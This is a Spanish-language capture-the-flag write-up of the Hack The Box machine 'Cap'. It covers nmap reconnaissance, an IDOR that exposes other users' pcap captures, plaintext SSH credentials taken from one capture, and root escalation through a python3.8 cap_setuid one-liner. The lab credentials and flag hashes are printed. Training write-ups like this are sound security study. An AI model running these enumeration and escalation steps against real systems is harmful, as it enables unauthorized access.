---
tags:
  - wireshark
  - pcap
  - python
  - capability
title: Cap- Easy (HTB)
permalink: /Cap-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introduccion

`Cap` es una máquina de dificultad `Facil` `Linux` que ejecuta un servidor `HTTP` que realiza funciones administrativas, incluyendo la realización de capturas de red. Los controles inadecuados dan como resultado una referencia de objeto directo insegura (`IDOR`) que da acceso a la captura de otro usuario. La captura contiene `credenciales` de texto plano y se puede utilizar para ganar punto de apoyo. Una `capability` de Linux se aprovecha para escalar a root.
# Reconocimiento

```bash 
nmap -sS -p- --open --min-rate 5000 -n -vvv 10.10.10.245
```

Para posteriormente escanear los servicios que corren para cada puerto

```bash
nmap -sCV -p22,80 10.129.252.24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 21:17 -03
Nmap scan report for cap.htb (10.129.252.24)
Host is up (0.57s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.51 seconds
```

## Website / Port 80

La pagina en la pestaña principal parece ser una pagina la cual maneja metricas de algun servicio.

![image-center](/assets/images/{0770C699-6C64-4AF3-8CED-636BE11DF562}.png)
## Shell as nathan 
### IDOR Vuln

Si me voy a la sección de `Security Snapshots` veo la siguiente interfaz y ya la url me parece rara.

![image-center](/assets/images/Pasted image 20250613193055.png)

Si en la url cambiamos , `http://10.10.10.245/data/0` o 1, 2, Voy viendo un diferente output para cada `url`, donde podemos ver un botón de descarga , el cual nos descarga un archivo `.pcap`, el cual lo podemos analizar con `wireshark`

![image-center](/assets/images/Pasted image 20250613193301.png)

Donde vemos las credenciales del usuario `natan` (`Buck3tH4TF0RM3!`), en texto plano, las mismas las uso para conectarme al protocolo `SSH`

```bash
ssh nathan@cap.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nathan@cap.htb''s password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
[..snip..]

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$
```

```bash
nathan@cap:~$ cat user.txt 
d7162516097d13b41345767dad4f44ed
```

## Shell as root

### Enumeration

Viendo por capabilities, veo `python3.8` el cual ya supone un riesgo.

```bash
nathan@cap:~$ getcap -r / 2>/dev/null 
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Para veo como puedo obtener una shell como `root` abusando de esta `capabilities`, puedo ir a la pagina de [GTFObins](https://gtfobins.github.io/gtfobins/python/)

Ejecutamos el comando que nos indica en el blog para poder escalar a `root`.

```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# whoami
root
```

```bash
# cat /root/root.txt
27849cb97225cc0c0599491d0223537a
```
